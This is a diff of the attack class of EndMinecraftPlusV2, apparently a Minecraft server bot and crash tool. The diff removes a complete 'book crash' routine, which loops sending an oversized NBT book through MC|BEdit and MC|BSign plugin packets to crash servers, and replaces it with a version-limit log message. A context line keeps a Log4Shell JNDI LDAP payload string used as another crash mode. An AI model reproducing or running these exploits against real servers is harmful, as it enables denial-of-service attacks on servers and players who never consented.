@@ -9,7 +9,6 @@ import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtoco
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.ProtocolLibs;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.VersionSupport578;
 import com.github.steveice10.mc.protocol.MinecraftProtocol;
-import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
 import com.github.steveice10.mc.protocol.data.message.Message;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
@@ -20,21 +19,14 @@ import com.github.steveice10.mc.protocol.packet.ingame.server.ServerJoinGamePack
 import com.github.steveice10.mc.protocol.packet.ingame.server.ServerKeepAlivePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.server.entity.player.ServerPlayerPositionRotationPacket;
-import com.github.steveice10.opennbt.NBTIO;
-import com.github.steveice10.opennbt.tag.builtin.CompoundTag;
-import com.github.steveice10.opennbt.tag.builtin.ListTag;
-import com.github.steveice10.opennbt.tag.builtin.StringTag;
-import com.github.steveice10.opennbt.tag.builtin.Tag;
 import com.github.steveice10.packetlib.Client;
 import com.github.steveice10.packetlib.ProxyInfo;
 import com.github.steveice10.packetlib.Session;
 import com.github.steveice10.packetlib.event.session.*;
-import com.github.steveice10.packetlib.io.stream.StreamNetOutput;
 import com.github.steveice10.packetlib.packet.Packet;
 import com.github.steveice10.packetlib.tcp.TcpSessionFactory;
 import io.netty.util.internal.ConcurrentSet;
 
-import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
@@ -113,28 +105,7 @@ public class BotAttack extends IAttack {
                                 new Thread(() -> {
                                     switch (ConfigUtil.ServerCrasherMode) {
                                         case 1:
-                                            new Thread(() -> {
-                                                while (c.isConnected()) {
-                                                    try {
-                                                        ItemStack crashBook = getCrashBook();
-
-                                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
-                                                        StreamNetOutput out = new StreamNetOutput(buf);
-
-                                                        out.writeShort(crashBook.getId());
-                                                        out.writeByte(crashBook.getAmount());
-
-                                                        NBTIO.writeTag(buf, crashBook.getNbt());
-
-                                                        byte[] crashData = buf.toByteArray();
-
-                                                        c.send(new ClientPluginMessagePacket("MC|BEdit", crashData));
-                                                        c.send(new ClientPluginMessagePacket("MC|BSign", crashData));
-
-                                                        OtherUtils.doSleep(ConfigUtil.ServerCrasherPacketDelay);
-                                                    } catch (Exception ignored) {}
-                                                }
-                                            }).start();
+                                            LogUtil.doLog(0, "Book Crash仅适用于1.8.X版本。", "ServerCrasher");
                                             break;
                                         case 2:
                                             String log4jExploit = "${jndi:ldap://192.168.${RandomUtils.nextInt(1,253)}.${RandomUtils.nextInt(1,253)}}";
@@ -537,22 +508,4 @@ public class BotAttack extends IAttack {
         }
     }
 
-    public static ItemStack getCrashBook() {
-        ItemStack crashBook;
-        CompoundTag nbtTag = new CompoundTag("crashBook");
-        List<Tag> pageList = new ArrayList<>();
-
-        // Plain Mode
-        nbtTag.put(new StringTag("author", OtherUtils.getRandomString(20, 20)));
-        nbtTag.put(new StringTag("title", OtherUtils.getRandomString(20, 20)));
-
-        for (int a = 0; a < 35; a++) {
-            pageList.add(new StringTag("", OtherUtils.getRandomString(600, 600)));
-        }
-
-        nbtTag.put(new ListTag("pages", pageList));
-        crashBook = new ItemStack(386, 1, nbtTag);
-
-        return crashBook;
-    }
 }
